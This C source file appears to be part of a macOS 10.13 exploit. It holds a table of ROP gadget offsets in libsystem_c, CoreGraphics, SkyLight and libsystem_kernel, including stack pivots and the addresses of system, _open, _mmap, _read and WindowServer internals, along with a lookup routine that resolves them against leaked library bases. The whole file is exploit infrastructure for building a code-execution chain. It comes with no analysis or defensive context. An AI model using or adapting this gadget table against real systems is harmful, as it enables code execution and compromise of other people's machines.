#define NONE 0
#define LIBSYSTEM_C 1
#define COREGRAPHICS 2
#define SKYLIGHT 3
#define LIBSYSTEM_KERNEL 4

#define MAC_10_13_2 0
#define MAC_10_13_3 1
#define MAC_10_13_4_BETA_4 2

uint64_t* bases;

uint64_t* allocate_lib_bases() {
    bases = calloc(sizeof(uint64_t), 5);
    return bases;
}

struct offset {
    char* name;
    int base;
    int offset;
} offsets[] = {
    {"god pivot 1", COREGRAPHICS, 0x8e23e},
    {"god pivot 2", COREGRAPHICS, 0x5b117},

    {"pop rsp; ret",                    LIBSYSTEM_C, 0x1e940},
    {"pop rax; pop rbx; pop rbp; ret",  LIBSYSTEM_C, 0x2b916},
    {"pop rcx; ret",                    LIBSYSTEM_C, 0x1d8a2},
    {"mov [rax], rcx; ret",             LIBSYSTEM_C, 0x79e35},
    {"pop rdi; pop rbp; ret",           LIBSYSTEM_C, 0x18245},
    {"mov rax, rcx; ret",               LIBSYSTEM_C, 0x06bc5},
    {"pop rdx; mov eax, 1; ret",        LIBSYSTEM_C, 0x327ed},
    {"pop rsi; pop rbp; ret",           LIBSYSTEM_C, 0x01ec2},
    {"pop r8; mov rax, r8; ret",        LIBSYSTEM_C, 0x01566},
    {"pop r15; pop rbp; ret",           LIBSYSTEM_C, 0x52dc4},

    {"xor r9d, r9d; call r15",          SKYLIGHT, 0x126321},
    {"add rsp, 0x10; pop rbp; ret",     SKYLIGHT, 0x22cec8},
    {"jmp rax",                         SKYLIGHT, 0x25596a},
    {"mov rdi, rax; call r15",          SKYLIGHT, 0x125588},
    {"mov rax, rsi; pop rbp; ret",      SKYLIGHT, 0x128118},
    {"mov rsi, [r15]; call r14",        SKYLIGHT, 0x019270},
    {"pop r14; pop rbp; ret",           SKYLIGHT, 0x2518ba},
    {"mov [rcx], rax; pop rbp; ret",    SKYLIGHT, 0x143c19},

    {"system", LIBSYSTEM_C, 0x7c852},

    {"_open", LIBSYSTEM_KERNEL, 0x1bb30},
    {"_mmap", LIBSYSTEM_KERNEL, 0x17647},
    {"_read", LIBSYSTEM_KERNEL, 0x1d410},

    {"_CGXConnectionForConnectionID", SKYLIGHT, 0x1B56CC},
    {"_get_default_connection_tls_key", SKYLIGHT, 0x2BC738},
    {"_SLXServer_loop", SKYLIGHT, 0x24B2AA},

    {"writable_mem", LIBSYSTEM_C, 0x38fe6000},

    {"objc_release_offset", NONE, 0x88},
};

uint64_t get_offset(char* g) {
    int max = sizeof(offsets)/sizeof(struct offset);
    for (int i = 0; i < max; i++) {
        if (!offsets[i].name)
            continue;
        if (strcmp(g, offsets[i].name))
            continue;
        return bases[offsets[i].base]+offsets[i].offset;
    }
    printf("Did not find '%s'\n", g);
    abort();
    return 0;
}
